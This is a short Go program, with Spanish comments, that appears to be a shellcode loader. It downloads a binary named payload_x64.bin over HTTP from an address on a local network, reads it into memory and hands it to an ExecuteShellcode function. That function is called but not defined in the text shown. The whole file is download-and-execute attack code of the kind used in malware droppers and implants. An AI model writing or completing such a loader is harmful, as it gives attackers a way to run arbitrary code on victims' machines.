package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	url := "http://192.168.2.171:8000/payload_x64.bin"

	// Descargar el archivo binario
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("Error al descargar el archivo:", err)
		return
	}
	defer resp.Body.Close()

	// Leer el contenido del archivo
	shellcode, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error al leer el archivo:", err)
		return
	}

	// Ejecutar el shellcode
	addr, err := ExecuteShellcode(shellcode)
	if err != nil {
		fmt.Println("Error al ejecutar el shellcode:", err)
		return
	}

	fmt.Printf("Shellcode ejecutado correctamente en la dirección de memoria: 0x%x\n", addr)
}
